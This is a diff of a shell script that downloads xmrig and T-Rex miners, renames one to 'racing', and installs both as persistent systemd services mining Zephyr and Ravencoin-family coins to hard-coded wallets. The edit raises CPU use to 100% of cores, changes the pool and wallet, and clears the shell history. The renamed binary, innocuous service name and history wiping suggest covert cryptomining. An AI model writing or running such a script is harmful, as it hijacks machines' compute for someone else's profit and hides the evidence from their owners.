@@ -1,7 +1,7 @@
 cd /home
 myworker=$(TZ='Asia/Ho_Chi_Minh' date +'%d-%m_%H')
 noCore=$(nproc --all)
-usingcore=$((noCore*80/100))
+usingcore=$((noCore*100/100))
 if [[ $noCore -eq 6 ]]
 then
     sudo apt-get install linux-headers-$(uname -r) -y
@@ -29,14 +29,15 @@ then
     sudo systemctl daemon-reload
     sudo systemctl enable xmrig.service
     sudo ./xmrig-6.18.1/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHs8j21LWinpixofoVJP5KsXTCvaaTqjP1z4YwvDj3MHHe2UcmhA8UTUPTZ4MiQsjdX88aYg14rEJDYqdoQKkJeCq7NXq1XVT -p ${myworker}_ST_C_${noCore} --coin zephyr -a rx/0 -t= ${usingcore} &
-    
+
     sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
     sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
     sudo mv t-rex racing
-    sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o stratum+tcp://xna.2miners.com:6060 -u NWKsvmVnL3tEyWkZEzwpVcC1pVPRe5uW7k."'${myworker}_R_ST_X_'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+    sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ."'${myworker}_ST_C_M_${noCore}_re'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
     sudo systemctl daemon-reload
     sudo systemctl enable racing.service
-    sudo ./racing -a kawpow -o stratum+tcp://xna.2miners.com:6060 -u NWKsvmVnL3tEyWkZEzwpVcC1pVPRe5uW7k.${myworker}_ST_R_ -p x &
+    sudo ./racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ.${myworker}_ST_C_M_${noCore} -p x &
+    
     history -c
 else
     sudo wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-bionic-x64.tar.gz
